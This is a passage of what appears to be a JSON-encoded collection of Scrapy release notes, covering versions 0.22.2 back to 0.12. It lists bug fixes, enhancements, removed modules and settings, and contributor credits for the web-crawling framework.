to fix typos (:issue:`628`)\n- Fix default value of attrs argument in SgmlLinkExtractor to be tuple (:issue:`661`)\n- Fix XXE flaw in sitemap reader (:issue:`676`)\n- Fix engine to support filtered start requests (:issue:`707`)\n- Fix offsite middleware case on urls with no hostnames (:issue:`745`)\n- Testsuite doesn't require PIL anymore (:issue:`585`)\n\n\n", "0.22.2": "-----------------------------------\n\n- fix a reference to unexistent engine.slots. closes 593 (:commit:`13c099a`)\n- downloaderMW doc typo (spiderMW doc copy remnant) (:commit:`8ae11bf`)\n- Correct typos (:commit:`1346037`)\n\n", "0.22.1": "-----------------------------------\n\n- localhost666 can resolve under certain circumstances (:commit:`2ec2279`)\n- test inspect.stack failure (:commit:`cc3eda3`)\n- Handle cases when inspect.stack() fails (:commit:`8cb44f9`)\n- Fix wrong checks on subclassing of deprecated classes. closes 581 (:commit:`46d98d6`)\n- Docs: 4-space indent for final spider example (:commit:`13846de`)\n- Fix HtmlParserLinkExtractor and tests after 485 merge (:commit:`368a946`)\n- BaseSgmlLinkExtractor: Fixed the missing space when the link has an inner tag (:commit:`b566388`)\n- BaseSgmlLinkExtractor: Added unit test of a link with an inner tag (:commit:`c1cb418`)\n- BaseSgmlLinkExtractor: Fixed unknown_endtag() so that it only set current_link=None when the end tag match the opening tag (:commit:`7e4d627`)\n- Fix tests for Travis-CI build (:commit:`76c7e20`)\n- replace unencodeable codepoints with html entities. fixes 562 and 285 (:commit:`5f87b17`)\n- RegexLinkExtractor: encode URL unicode value when creating Links (:commit:`d0ee545`)\n- Updated the tutorial crawl output with latest output. (:commit:`8da65de`)\n- Updated shell docs with the crawler reference and fixed the actual shell output. (:commit:`875b9ab`)\n- PEP8 minor edits. (:commit:`f89efaf`)\n- Expose current crawler in the Scrapy shell. (:commit:`5349cec`)\n- Unused re import and PEP8 minor edits. (:commit:`387f414`)\n- Ignore None's values when using the ItemLoader. (:commit:`0632546`)\n- DOC Fixed HTTPCACHE_STORAGE typo in the default value which is now Filesystem instead Dbm. (:commit:`cde9a8c`)\n- show Ubuntu setup instructions as literal code (:commit:`fb5c9c5`)\n- Update Ubuntu installation instructions (:commit:`70fb105`)\n- Merge pull request 550 from stray-leone/patch-1 (:commit:`6f70b6a`)\n- modify the version of Scrapy Ubuntu package (:commit:`725900d`)\n- fix 0.22.0 release date (:commit:`af0219a`)\n- fix typos in news.rst and remove (not released yet) header (:commit:`b7f58f4`)\n\n", "0.22.0": "-----------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n- [**Backward incompatible**] Switched HTTPCacheMiddleware backend to filesystem (:issue:`541`)\n  To restore old backend set ``HTTPCACHE_STORAGE`` to ``scrapy.contrib.httpcache.DbmCacheStorage``\n- Proxy \\https:// urls using CONNECT method (:issue:`392`, :issue:`397`)\n- Add a middleware to crawl ajax crawlable pages as defined by google (:issue:`343`)\n- Rename scrapy.spider.BaseSpider to scrapy.spider.Spider (:issue:`510`, :issue:`519`)\n- Selectors register EXSLT namespaces by default (:issue:`472`)\n- Unify item loaders similar to selectors renaming (:issue:`461`)\n- Make ``RFPDupeFilter`` class easily subclassable (:issue:`533`)\n- Improve test coverage and forthcoming Python 3 support (:issue:`525`)\n- Promote startup info on settings and middleware to INFO level (:issue:`520`)\n- Support partials in ``get_func_args`` util (:issue:`506`, issue:`504`)\n- Allow running individual tests via tox (:issue:`503`)\n- Update extensions ignored by link extractors (:issue:`498`)\n- Add middleware methods to get files/images/thumbs paths (:issue:`490`)\n- Improve offsite middleware tests (:issue:`478`)\n- Add a way to skip default Referer header set by RefererMiddleware (:issue:`475`)\n- Do not send ``x-gzip`` in default ``Accept-Encoding`` header (:issue:`469`)\n- Support defining http error handling using settings (:issue:`466`)\n- Use modern python idioms wherever you find legacies (:issue:`497`)\n- Improve and correct documentation\n  (:issue:`527`, :issue:`524`, :issue:`521`, :issue:`517`, :issue:`512`, :issue:`505`,\n  :issue:`502`, :issue:`489`, :issue:`465`, :issue:`460`, :issue:`425`, :issue:`536`)\n\nFixes\n~~~~~\n\n- Update Selector class imports in CrawlSpider template (:issue:`484`)\n- Fix unexistent reference to ``engine.slots`` (:issue:`464`)\n- Do not try to call ``body_as_unicode()`` on a non-TextResponse instance (:issue:`462`)\n- Warn when subclassing XPathItemLoader, previously it only warned on\n  instantiation. (:issue:`523`)\n- Warn when subclassing XPathSelector, previously it only warned on\n  instantiation. (:issue:`537`)\n- Multiple fixes to memory stats (:issue:`531`, :issue:`530`, :issue:`529`)\n- Fix overriding url in ``FormRequest.from_response()`` (:issue:`507`)\n- Fix tests runner under pip 1.5 (:issue:`513`)\n- Fix logging error when spider name is unicode (:issue:`479`)\n\n", "0.20.2": "-----------------------------------\n\n- Update CrawlSpider Template with Selector changes (:commit:`6d1457d`)\n- fix method name in tutorial. closes GH-480 (:commit:`b4fc359`\n\n", "0.20.1": "-----------------------------------\n\n- include_package_data is required to build wheels from published sources (:commit:`5ba1ad5`)\n- process_parallel was leaking the failures on its internal deferreds.  closes 458 (:commit:`419a780`)\n\n", "0.20.0": "-----------------------------------\n\nEnhancements\n~~~~~~~~~~~~\n\n- New Selector's API including CSS selectors (:issue:`395` and :issue:`426`),\n- Request/Response url/body attributes are now immutable\n  (modifying them had been deprecated for a long time)\n- :setting:`ITEM_PIPELINES` is now defined as a dict (instead of a list)\n- Sitemap spider can fetch alternate URLs (:issue:`360`)\n- ``Selector.remove_namespaces()`` now remove namespaces from element's attributes. (:issue:`416`)\n- Paved the road for Python 3.3+ (:issue:`435`, :issue:`436`, :issue:`431`, :issue:`452`)\n- New item exporter using native python types with nesting support (:issue:`366`)\n- Tune HTTP1.1 pool size so it matches concurrency defined by settings (:commit:`b43b5f575`)\n- scrapy.mail.MailSender now can connect over TLS or upgrade using STARTTLS (:issue:`327`)\n- New FilesPipeline with functionality factored out from ImagesPipeline (:issue:`370`, :issue:`409`)\n- Recommend Pillow instead of PIL for image handling (:issue:`317`)\n- Added Debian packages for Ubuntu Quantal and Raring (:commit:`86230c0`)\n- Mock server (used for tests) can listen for HTTPS requests (:issue:`410`)\n- Remove multi spider support from multiple core components\n  (:issue:`422`, :issue:`421`, :issue:`420`, :issue:`419`, :issue:`423`, :issue:`418`)\n- Travis-CI now tests Scrapy changes against development versions of ``w3lib`` and ``queuelib`` python packages.\n- Add pypy 2.1 to continuous integration tests (:commit:`ecfa7431`)\n- Pylinted, pep8 and removed old-style exceptions from source (:issue:`430`, :issue:`432`)\n- Use importlib for parametric imports (:issue:`445`)\n- Handle a regression introduced in Python 2.7.5 that affects XmlItemExporter (:issue:`372`)\n- Bugfix crawling shutdown on SIGINT (:issue:`450`)\n- Do not submit ``reset`` type inputs in FormRequest.from_response (:commit:`b326b87`)\n- Do not silence download errors when request errback raises an exception (:commit:`684cfc0`)\n\nBugfixes\n~~~~~~~~\n\n- Fix tests under Django 1.6 (:commit:`b6bed44c`)\n- Lot of bugfixes to retry middleware under disconnections using HTTP 1.1 download handler\n- Fix inconsistencies among Twisted releases (:issue:`406`)\n- Fix Scrapy shell bugs (:issue:`418`, :issue:`407`)\n- Fix invalid variable name in setup.py (:issue:`429`)\n- Fix tutorial references (:issue:`387`)\n- Improve request-response docs (:issue:`391`)\n- Improve best practices docs (:issue:`399`, :issue:`400`, :issue:`401`, :issue:`402`)\n- Improve django integration docs (:issue:`404`)\n- Document ``bindaddress`` request meta (:commit:`37c24e01d7`)\n- Improve ``Request`` class documentation (:issue:`226`)\n\nOther\n~~~~~\n\n- Dropped Python 2.6 support (:issue:`448`)\n- Add :doc:`cssselect <cssselect:index>` python package as install dependency\n- Drop libxml2 and multi selector's backend support, `lxml`_ is required from now on.\n- Minimum Twisted version increased to 10.0.0, dropped Twisted 8.0 support.\n- Running test suite now requires ``mock`` python library (:issue:`390`)\n\n\nThanks\n~~~~~~\n\nThanks to everyone who contribute to this release!\n\nList of contributors sorted by number of commits::\n\n     69 Daniel Gra\u00f1a <dangra...>\n     37 Pablo Hoffman <pablo...>\n     13 Mikhail Korobov <kmike84...>\n      9 Alex Cepoi <alex.cepoi...>\n      9 alexanderlukanin13 <alexander.lukanin.13...>\n      8 Rolando Espinoza La fuente <darkrho...>\n      8 Lukasz Biedrycki <lukasz.biedrycki...>\n      6 Nicolas Ramirez <nramirez.uy...>\n      3 Paul Tremberth <paul.tremberth...>\n      2 Martin Olveyra <molveyra...>\n      2 Stefan <misc...>\n      2 Rolando Espinoza <darkrho...>\n      2 Loren Davie <loren...>\n      2 irgmedeiros <irgmedeiros...>\n      1 Stefan Koch <taikano...>\n      1 Stefan <cct...>\n      1 scraperdragon <dragon...>\n      1 Kumara Tharmalingam <ktharmal...>\n      1 Francesco Piccinno <stack.box...>\n      1 Marcos Campal <duendex...>\n      1 Dragon Dave <dragon...>\n      1 Capi Etheriel <barraponto...>\n      1 cacovsky <amarquesferraz...>\n      1 Berend Iwema <berend...>\n\n", "0.18.4": "-----------------------------------\n\n- IPython refuses to update the namespace. fix 396 (:commit:`3d32c4f`)\n- Fix AlreadyCalledError replacing a request in shell command. closes 407 (:commit:`b1d8919`)\n- Fix start_requests laziness and early hangs (:commit:`89faf52`)\n\n", "0.18.3": "-----------------------------------\n\n- fix regression on lazy evaluation of start requests (:commit:`12693a5`)\n- forms: do not submit reset inputs (:commit:`e429f63`)\n- increase unittest timeouts to decrease travis false positive failures (:commit:`912202e`)\n- backport master fixes to json exporter (:commit:`cfc2d46`)\n- Fix permission and set umask before generating sdist tarball (:commit:`06149e0`)\n\n", "0.18.2": "-----------------------------------\n\n- Backport ``scrapy check`` command fixes and backward compatible multi\n  crawler process(:issue:`339`)\n\n", "0.18.1": "-----------------------------------\n\n- remove extra import added by cherry picked changes (:commit:`d20304e`)\n- fix crawling tests under twisted pre 11.0.0 (:commit:`1994f38`)\n- py26 can not format zero length fields {} (:commit:`abf756f`)\n- test PotentiaDataLoss errors on unbound responses (:commit:`b15470d`)\n- Treat responses without content-length or Transfer-Encoding as good responses (:commit:`c4bf324`)\n- do no include ResponseFailed if http11 handler is not enabled (:commit:`6cbe684`)\n- New HTTP client wraps connection lost in ResponseFailed exception. fix 373 (:commit:`1a20bba`)\n- limit travis-ci build matrix (:commit:`3b01bb8`)\n- Merge pull request 375 from peterarenot/patch-1 (:commit:`fa766d7`)\n- Fixed so it refers to the correct folder (:commit:`3283809`)\n- added Quantal & Raring to support Ubuntu releases (:commit:`1411923`)\n- fix retry middleware which didn't retry certain connection errors after the upgrade to http1 client, closes GH-373 (:commit:`bb35ed0`)\n- fix XmlItemExporter in Python 2.7.4 and 2.7.5 (:commit:`de3e451`)\n- minor updates to 0.18 release notes (:commit:`c45e5f1`)\n- fix contributors list format (:commit:`0b60031`)\n\n", "0.18.0": "-----------------------------------\n\n- Lot of improvements to testsuite run using Tox, including a way to test on pypi\n- Handle GET parameters for AJAX crawlable urls (:commit:`3fe2a32`)\n- Use lxml recover option to parse sitemaps (:issue:`347`)\n- Bugfix cookie merging by hostname and not by netloc (:issue:`352`)\n- Support disabling ``HttpCompressionMiddleware`` using a flag setting (:issue:`359`)\n- Support xml namespaces using ``iternodes`` parser in ``XMLFeedSpider`` (:issue:`12`)\n- Support ``dont_cache`` request meta flag (:issue:`19`)\n- Bugfix ``scrapy.utils.gz.gunzip`` broken by changes in python 2.7.4 (:commit:`4dc76e`)\n- Bugfix url encoding on ``SgmlLinkExtractor`` (:issue:`24`)\n- Bugfix ``TakeFirst`` processor shouldn't discard zero (0) value (:issue:`59`)\n- Support nested items in xml exporter (:issue:`66`)\n- Improve cookies handling performance (:issue:`77`)\n- Log dupe filtered requests once (:issue:`105`)\n- Split redirection middleware into status and meta based middlewares (:issue:`78`)\n- Use HTTP1.1 as default downloader handler (:issue:`109` and :issue:`318`)\n- Support xpath form selection on ``FormRequest.from_response`` (:issue:`185`)\n- Bugfix unicode decoding error on ``SgmlLinkExtractor`` (:issue:`199`)\n- Bugfix signal dispatching on pypi interpreter (:issue:`205`)\n- Improve request delay and concurrency handling (:issue:`206`)\n- Add RFC2616 cache policy to ``HttpCacheMiddleware`` (:issue:`212`)\n- Allow customization of messages logged by engine (:issue:`214`)\n- Multiples improvements to ``DjangoItem`` (:issue:`217`, :issue:`218`, :issue:`221`)\n- Extend Scrapy commands using setuptools entry points (:issue:`260`)\n- Allow spider ``allowed_domains`` value to be set/tuple (:issue:`261`)\n- Support ``settings.getdict`` (:issue:`269`)\n- Simplify internal ``scrapy.core.scraper`` slot handling (:issue:`271`)\n- Added ``Item.copy`` (:issue:`290`)\n- Collect idle downloader slots (:issue:`297`)\n- Add ``ftp://`` scheme downloader handler (:issue:`329`)\n- Added downloader benchmark webserver and spider tools :ref:`benchmarking`\n- Moved persistent (on disk) queues to a separate project (queuelib_) which Scrapy now depends on\n- Add Scrapy commands using external libraries (:issue:`260`)\n- Added ``--pdb`` option to ``scrapy`` command line tool\n- Added :meth:`XPathSelector.remove_namespaces <scrapy.selector.Selector.remove_namespaces>` which allows to remove all namespaces from XML documents for convenience (to work with namespace-less XPaths). Documented in :ref:`topics-selectors`.\n- Several improvements to spider contracts\n- New default middleware named MetaRefreshMiddleware that handles meta-refresh html tag redirections,\n- MetaRefreshMiddleware and RedirectMiddleware have different priorities to address 62\n- added from_crawler method to spiders\n- added system tests with mock server\n- more improvements to macOS compatibility (thanks Alex Cepoi)\n- several more cleanups to singletons and multi-spider support (thanks Nicolas Ramirez)\n- support custom download slots\n- added --spider option to \"shell\" command.\n- log overridden settings when Scrapy starts\n\nThanks to everyone who contribute to this release. Here is a list of\ncontributors sorted by number of commits::\n\n    130 Pablo Hoffman <pablo...>\n     97 Daniel Gra\u00f1a <dangra...>\n     20 Nicol\u00e1s Ram\u00edrez <nramirez.uy...>\n     13 Mikhail Korobov <kmike84...>\n     12 Pedro Faustino <pedrobandim...>\n     11 Steven Almeroth <sroth77...>\n      5 Rolando Espinoza La fuente <darkrho...>\n      4 Michal Danilak <mimino.coder...>\n      4 Alex Cepoi <alex.cepoi...>\n      4 Alexandr N Zamaraev (aka tonal) <tonal...>\n      3 paul <paul.tremberth...>\n      3 Martin Olveyra <molveyra...>\n      3 Jordi Llonch <llonchj...>\n      3 arijitchakraborty <myself.arijit...>\n      2 Shane Evans <shane.evans...>\n      2 joehillen <joehillen...>\n      2 Hart <HartSimha...>\n      2 Dan <ellisd23...>\n      1 Zuhao Wan <wanzuhao...>\n      1 whodatninja <blake...>\n      1 vkrest <v.krestiannykov...>\n      1 tpeng <pengtaoo...>\n      1 Tom Mortimer-Jones <tom...>\n      1 Rocio Aramberri <roschegel...>\n      1 Pedro <pedro...>\n      1 notsobad <wangxiaohugg...>\n      1 Natan L <kuyanatan.nlao...>\n      1 Mark Grey <mark.grey...>\n      1 Luan <luanpab...>\n      1 Libor Nenad\u00e1l <libor.nenadal...>\n      1 Juan M Uys <opyate...>\n      1 Jonas Brunsgaard <jonas.brunsgaard...>\n      1 Ilya Baryshev <baryshev...>\n      1 Hasnain Lakhani <m.hasnain.lakhani...>\n      1 Emanuel Schorsch <emschorsch...>\n      1 Chris Tilden <chris.tilden...>\n      1 Capi Etheriel <barraponto...>\n      1 cacovsky <amarquesferraz...>\n      1 Berend Iwema <berend...>\n\n\n", "0.16.5": "-----------------------------------\n\n- obey request method when Scrapy deploy is redirected to a new endpoint (:commit:`8c4fcee`)\n- fix inaccurate downloader middleware documentation. refs 280 (:commit:`40667cb`)\n- doc: remove links to diveintopython.org, which is no longer available. closes 246 (:commit:`bd58bfa`)\n- Find form nodes in invalid html5 documents (:commit:`e3d6945`)\n- Fix typo labeling attrs type bool instead of list (:commit:`a274276`)\n\n", "0.16.4": "-----------------------------------\n\n- fixes spelling errors in documentation (:commit:`6d2b3aa`)\n- add doc about disabling an extension. refs 132 (:commit:`c90de33`)\n- Fixed error message formatting. log.err() doesn't support cool formatting and when error occurred, the message was:    \"ERROR: Error processing %(item)s\" (:commit:`c16150c`)\n- lint and improve images pipeline error logging (:commit:`56b45fc`)\n- fixed doc typos (:commit:`243be84`)\n- add documentation topics: Broad Crawls & Common Practices (:commit:`1fbb715`)\n- fix bug in Scrapy parse command when spider is not specified explicitly. closes 209 (:commit:`c72e682`)\n- Update docs/topics/commands.rst (:commit:`28eac7a`)\n\n", "0.16.3": "-----------------------------------\n\n- Remove concurrency limitation when using download delays and still ensure inter-request delays are enforced (:commit:`487b9b5`)\n- add error details when image pipeline fails (:commit:`8232569`)\n- improve macOS compatibility (:commit:`8dcf8aa`)\n- setup.py: use README.rst to populate long_description (:commit:`7b5310d`)\n- doc: removed obsolete references to ClientForm (:commit:`80f9bb6`)\n- correct docs for default storage backend (:commit:`2aa491b`)\n- doc: removed broken proxyhub link from FAQ (:commit:`bdf61c4`)\n- Fixed docs typo in SpiderOpenCloseLogging example (:commit:`7184094`)\n\n\n", "0.16.2": "-----------------------------------\n\n- Scrapy contracts: python2.6 compat (:commit:`a4a9199`)\n- Scrapy contracts verbose option (:commit:`ec41673`)\n- proper unittest-like output for Scrapy contracts (:commit:`86635e4`)\n- added open_in_browser to debugging doc (:commit:`c9b690d`)\n- removed reference to global Scrapy stats from settings doc (:commit:`dd55067`)\n- Fix SpiderState bug in Windows platforms (:commit:`58998f4`)\n\n\n", "0.16.1": "-----------------------------------\n\n- fixed LogStats extension, which got broken after a wrong merge before the 0.16 release (:commit:`8c780fd`)\n- better backward compatibility for scrapy.conf.settings (:commit:`3403089`)\n- extended documentation on how to access crawler stats from extensions (:commit:`c4da0b5`)\n- removed .hgtags (no longer needed now that Scrapy uses git) (:commit:`d52c188`)\n- fix dashes under rst headers (:commit:`fa4f7f9`)\n- set release date for 0.16.0 in news (:commit:`e292246`)\n\n\n", "0.16.0": "-----------------------------------\n\nScrapy changes:\n\n- added :ref:`topics-contracts`, a mechanism for testing spiders in a formal/reproducible way\n- added options ``-o`` and ``-t`` to the :command:`runspider` command\n- documented :doc:`topics/autothrottle` and added to extensions installed by default. You still need to enable it with :setting:`AUTOTHROTTLE_ENABLED`\n- major Stats Collection refactoring: removed separation of global/per-spider stats, removed stats-related signals (``stats_spider_opened``, etc). Stats are much simpler now, backward compatibility is kept on the Stats Collector API and signals.\n- added :meth:`~scrapy.spidermiddlewares.SpiderMiddleware.process_start_requests` method to spider middlewares\n- dropped Signals singleton. Signals should now be accessed through the Crawler.signals attribute. See the signals documentation for more info.\n- dropped Stats Collector singleton. Stats can now be accessed through the Crawler.stats attribute. See the stats collection documentation for more info.\n- documented :ref:`topics-api`\n- ``lxml`` is now the default selectors backend instead of ``libxml2``\n- ported FormRequest.from_response() to use `lxml`_ instead of `ClientForm`_\n- removed modules: ``scrapy.xlib.BeautifulSoup`` and ``scrapy.xlib.ClientForm``\n- SitemapSpider: added support for sitemap urls ending in .xml and .xml.gz, even if they advertise a wrong content type (:commit:`10ed28b`)\n- StackTraceDump extension: also dump trackref live references (:commit:`fe2ce93`)\n- nested items now fully supported in JSON and JSONLines exporters\n- added :reqmeta:`cookiejar` Request meta key to support multiple cookie sessions per spider\n- decoupled encoding detection code to `w3lib.encoding`_, and ported Scrapy code to use that module\n- dropped support for Python 2.5. See https://blog.scrapinghub.com/2012/02/27/scrapy-0-15-dropping-support-for-python-2-5/\n- dropped support for Twisted 2.5\n- added :setting:`REFERER_ENABLED` setting, to control referer middleware\n- changed default user agent to: ``Scrapy/VERSION (+http://scrapy.org)``\n- removed (undocumented) ``HTMLImageLinkExtractor`` class from ``scrapy.contrib.linkextractors.image``\n- removed per-spider settings (to be replaced by instantiating multiple crawler objects)\n- ``USER_AGENT`` spider attribute will no longer work, use ``user_agent`` attribute instead\n- ``DOWNLOAD_TIMEOUT`` spider attribute will no longer work, use ``download_timeout`` attribute instead\n- removed ``ENCODING_ALIASES`` setting, as encoding auto-detection has been moved to the `w3lib`_ library\n- promoted :ref:`topics-djangoitem` to main contrib\n- LogFormatter method now return dicts(instead of strings) to support lazy formatting (:issue:`164`, :commit:`dcef7b0`)\n- downloader handlers (:setting:`DOWNLOAD_HANDLERS` setting) now receive settings as the first argument of the ``__init__`` method\n- replaced memory usage accounting with (more portable) `resource`_ module, removed ``scrapy.utils.memory`` module\n- removed signal: ``scrapy.mail.mail_sent``\n- removed ``TRACK_REFS`` setting, now :ref:`trackrefs <topics-leaks-trackrefs>` is always enabled\n- DBM is now the default storage backend for HTTP cache middleware\n- number of log messages (per level) are now tracked through Scrapy stats (stat name: ``log_count/LEVEL``)\n- number received responses are now tracked through Scrapy stats (stat name: ``response_received_count``)\n- removed ``scrapy.log.started`` attribute\n\n", "0.14.4": "-------------\n\n- added precise to supported Ubuntu distros (:commit:`b7e46df`)\n- fixed bug in json-rpc webservice reported in https://groups.google.com/forum/#!topic/scrapy-users/qgVBmFybNAQ/discussion. also removed no longer supported 'run' command from extras/scrapy-ws.py (:commit:`340fbdb`)\n- meta tag attributes for content-type http equiv can be in any order. 123 (:commit:`0cb68af`)\n- replace \"import Image\" by more standard \"from PIL import Image\". closes 88 (:commit:`4d17048`)\n- return trial status as bin/runtests.sh exit value. 118 (:commit:`b7b2e7f`)\n\n", "0.14.3": "-------------\n\n- forgot to include pydispatch license. 118 (:commit:`fd85f9c`)\n- include egg files used by testsuite in source distribution. 118 (:commit:`c897793`)\n- update docstring in project template to avoid confusion with genspider command, which may be considered as an advanced feature. refs 107 (:commit:`2548dcc`)\n- added note to docs/topics/firebug.rst about google directory being shut down (:commit:`668e352`)\n- don't discard slot when empty, just save in another dict in order to recycle if needed again. (:commit:`8e9f607`)\n- do not fail handling unicode xpaths in libxml2 backed selectors (:commit:`b830e95`)\n- fixed minor mistake in Request objects documentation (:commit:`bf3c9ee`)\n- fixed minor defect in link extractors documentation (:commit:`ba14f38`)\n- removed some obsolete remaining code related to sqlite support in Scrapy (:commit:`0665175`)\n\n", "0.14.2": "-------------\n\n- move buffer pointing to start of file before computing checksum. refs 92 (:commit:`6a5bef2`)\n- Compute image checksum before persisting images. closes 92 (:commit:`9817df1`)\n- remove leaking references in cached failures (:commit:`673a120`)\n- fixed bug in MemoryUsage extension: get_engine_status() takes exactly 1 argument (0 given) (:commit:`11133e9`)\n- fixed struct.error on http compression middleware. closes 87 (:commit:`1423140`)\n- ajax crawling wasn't expanding for unicode urls (:commit:`0de3fb4`)\n- Catch start_requests iterator errors. refs 83 (:commit:`454a21d`)\n- Speed-up libxml2 XPathSelector (:commit:`2fbd662`)\n- updated versioning doc according to recent changes (:commit:`0a070f5`)\n- scrapyd: fixed documentation link (:commit:`2b4e4c3`)\n- extras/makedeb.py: no longer obtaining version from git (:commit:`caffe0e`)\n\n", "0.14.1": "-------------\n\n- extras/makedeb.py: no longer obtaining version from git (:commit:`caffe0e`)\n- bumped version to 0.14.1 (:commit:`6cb9e1c`)\n- fixed reference to tutorial directory (:commit:`4b86bd6`)\n- doc: removed duplicated callback argument from Request.replace() (:commit:`1aeccdd`)\n- fixed formatting of scrapyd doc (:commit:`8bf19e6`)\n- Dump stacks for all running threads and fix engine status dumped by StackTraceDump extension (:commit:`14a8e6e`)\n- added comment about why we disable ssl on boto images upload (:commit:`5223575`)\n- SSL handshaking hangs when doing too many parallel connections to S3 (:commit:`63d583d`)\n- change tutorial to follow changes on dmoz site (:commit:`bcb3198`)\n- Avoid _disconnectedDeferred AttributeError exception in Twisted>=11.1.0 (:commit:`98f3f87`)\n- allow spider to set autothrottle max concurrency (:commit:`175a4b5`)\n\n", "0.14": "-----------\n\nNew features and settings\n~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Support for `AJAX crawlable urls`_\n- New persistent scheduler that stores requests on disk, allowing to suspend and resume crawls (:rev:`2737`)\n- added ``-o`` option to ``scrapy crawl``, a shortcut for dumping scraped items into a file (or standard output using ``-``)\n- Added support for passing custom settings to Scrapyd ``schedule.json`` api (:rev:`2779`, :rev:`2783`)\n- New ``ChunkedTransferMiddleware`` (enabled by default) to support `chunked transfer encoding`_ (:rev:`2769`)\n- Add boto 2.0 support for S3 downloader handler (:rev:`2763`)\n- Added `marshal`_ to formats supported by feed exports (:rev:`2744`)\n- In request errbacks, offending requests are now received in ``failure.request`` attribute (:rev:`2738`)\n- Big downloader refactoring to support per domain/ip concurrency limits (:rev:`2732`)\n   - ``CONCURRENT_REQUESTS_PER_SPIDER`` setting has been deprecated and replaced by:\n      - :setting:`CONCURRENT_REQUESTS`, :setting:`CONCURRENT_REQUESTS_PER_DOMAIN`, :setting:`CONCURRENT_REQUESTS_PER_IP`\n   - check the documentation for more details\n- Added builtin caching DNS resolver (:rev:`2728`)\n- Moved Amazon AWS-related components/extensions (SQS spider queue, SimpleDB stats collector) to a separate project: [scaws](https://github.com/scrapinghub/scaws) (:rev:`2706`, :rev:`2714`)\n- Moved spider queues to scrapyd: ``scrapy.spiderqueue`` -> ``scrapyd.spiderqueue`` (:rev:`2708`)\n- Moved sqlite utils to scrapyd: ``scrapy.utils.sqlite`` -> ``scrapyd.sqlite`` (:rev:`2781`)\n- Real support for returning iterators on ``start_requests()`` method. The iterator is now consumed during the crawl when the spider is getting idle (:rev:`2704`)\n- Added :setting:`REDIRECT_ENABLED` setting to quickly enable/disable the redirect middleware (:rev:`2697`)\n- Added :setting:`RETRY_ENABLED` setting to quickly enable/disable the retry middleware (:rev:`2694`)\n- Added ``CloseSpider`` exception to manually close spiders (:rev:`2691`)\n- Improved encoding detection by adding support for HTML5 meta charset declaration (:rev:`2690`)\n- Refactored close spider behavior to wait for all downloads to finish and be processed by spiders, before closing the spider (:rev:`2688`)\n- Added ``SitemapSpider`` (see documentation in Spiders page) (:rev:`2658`)\n- Added ``LogStats`` extension for periodically logging basic stats (like crawled pages and scraped items) (:rev:`2657`)\n- Make handling of gzipped responses more robust (319, :rev:`2643`). Now Scrapy will try and decompress as much as possible from a gzipped response, instead of failing with an ``IOError``.\n- Simplified !MemoryDebugger extension to use stats for dumping memory debugging info (:rev:`2639`)\n- Added new command to edit spiders: ``scrapy edit`` (:rev:`2636`) and ``-e`` flag to ``genspider`` command that uses it (:rev:`2653`)\n- Changed default representation of items to pretty-printed dicts. (:rev:`2631`). This improves default logging by making log more readable in the default case, for both Scraped and Dropped lines.\n- Added :signal:`spider_error` signal (:rev:`2628`)\n- Added :setting:`COOKIES_ENABLED` setting (:rev:`2625`)\n- Stats are now dumped to Scrapy log (default value of :setting:`STATS_DUMP` setting has been changed to ``True``). This is to make Scrapy users more aware of Scrapy stats and the data that is collected there.\n- Added support for dynamically adjusting download delay and maximum concurrent requests (:rev:`2599`)\n- Added new DBM HTTP cache storage backend (:rev:`2576`)\n- Added ``listjobs.json`` API to Scrapyd (:rev:`2571`)\n- ``CsvItemExporter``: added ``join_multivalued`` parameter (:rev:`2578`)\n- Added namespace support to ``xmliter_lxml`` (:rev:`2552`)\n- Improved cookies middleware by making ``COOKIES_DEBUG`` nicer and documenting it (:rev:`2579`)\n- Several improvements to Scrapyd and Link extractors\n\nCode rearranged and removed\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Merged item passed and item scraped concepts, as they have often proved confusing in the past. This means: (:rev:`2630`)\n   - original item_scraped signal was removed\n   - original item_passed signal was renamed to item_scraped\n   - old log lines ``Scraped Item...`` were removed\n   - old log lines ``Passed Item...`` were renamed to ``Scraped Item...`` lines and downgraded to ``DEBUG`` level\n- Reduced Scrapy codebase by striping part of Scrapy code into two new libraries:\n   - `w3lib`_ (several functions from ``scrapy.utils.{http,markup,multipart,response,url}``, done in :rev:`2584`)\n   - `scrapely`_ (was ``scrapy.contrib.ibl``, done in :rev:`2586`)\n- Removed unused function: ``scrapy.utils.request.request_info()`` (:rev:`2577`)\n- Removed googledir project from ``examples/googledir``. There's now a new example project called ``dirbot`` available on GitHub: https://github.com/scrapy/dirbot\n- Removed support for default field values in Scrapy items (:rev:`2616`)\n- Removed experimental crawlspider v2 (:rev:`2632`)\n- Removed scheduler middleware to simplify architecture. Duplicates filter is now done in the scheduler itself, using the same dupe filtering class as before (``DUPEFILTER_CLASS`` setting) (:rev:`2640`)\n- Removed support for passing urls to ``scrapy crawl`` command (use ``scrapy parse`` instead) (:rev:`2704`)\n- Removed deprecated Execution Queue (:rev:`2704`)\n- Removed (undocumented) spider context extension (from scrapy.contrib.spidercontext) (:rev:`2780`)\n- removed ``CONCURRENT_SPIDERS`` setting (use scrapyd maxproc instead) (:rev:`2789`)\n- Renamed attributes of core components: downloader.sites -> downloader.slots, scraper.sites -> scraper.slots (:rev:`2717`, :rev:`2718`)\n- Renamed setting ``CLOSESPIDER_ITEMPASSED`` to :setting:`CLOSESPIDER_ITEMCOUNT` (:rev:`2655`). Backward compatibility kept.\n\n", "0.12": "-----------\n\nThe numbers like NNN reference tickets in the old issue tracker (Trac) which is no longer available.\n\nNew features and improvements\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Passed item is now sent in the ``item`` argument of the :signal:`item_passed\n  <item_scraped>` (273)\n- Added verbose option to ``scrapy version`` command, useful for bug reports (298)\n- HTTP cache now stored by default in the project data dir (279)\n- Added project data storage directory (276, 277)\n- Documented file structure of Scrapy projects (see command-line tool doc)\n- New lxml backend for XPath selectors (147)\n- Per-spider settings (245)\n- Support exit codes to signal errors in Scrapy commands (248)\n- Added ``-c`` argument to ``scrapy shell`` command\n- Made ``libxml2`` optional (260)\n- New ``deploy`` command (261)\n- Added :setting:`CLOSESPIDER_PAGECOUNT` setting (253)\n- Added :setting:`CLOSESPIDER_ERRORCOUNT` setting (254)\n\nScrapyd changes\n~~~~~~~~~~~~~~~\n\n- Scrapyd now uses one process per spider\n- It stores one log file per spider run, and rotate them keeping the latest 5 logs per spider (by default)\n- A minimal web ui was added, available at http://localhost:6800 by default\n- There is now a ``scrapy server`` command to start a Scrapyd server of the current project\n\nChanges to 